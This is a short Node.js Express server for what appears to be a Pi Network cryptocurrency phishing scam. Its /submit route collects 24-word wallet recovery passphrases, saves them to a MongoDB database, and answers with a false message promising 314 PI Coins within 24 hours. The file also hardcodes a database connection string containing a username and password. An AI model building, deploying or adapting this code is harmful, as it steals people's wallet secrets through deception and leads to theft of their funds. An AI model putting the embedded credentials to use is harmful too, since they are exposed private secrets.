const express = require("express");
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Connect to MongoDB
const mongoURI = "mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("MongoDB connected"))
    .catch(err => console.error("MongoDB connection error:", err));

// Define schema and model
const PassphraseSchema = new mongoose.Schema({
    passphrase: { type: String, required: true }
});

const Passphrase = mongoose.model("Passphrase", PassphraseSchema);

// Routes
app.post("/submit", async (req, res) => {
    const { passphrase } = req.body;

    if (!passphrase || passphrase.split(" ").length !== 24) {
        return res.status(400).send("Invalid passphrase. Please enter a 24-word passphrase.");
    }

    try {
        const newPassphrase = new Passphrase({ passphrase });
        await newPassphrase.save();
        res.send({ message: "Congratulations!!! You have earned your 314 PI Coins Successfully. It will be in your wallet within 24hrs." });
    } catch (err) {
        console.error("Error saving passphrase:", err);
        res.status(500).send("Server error. Please try again later.");
    }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
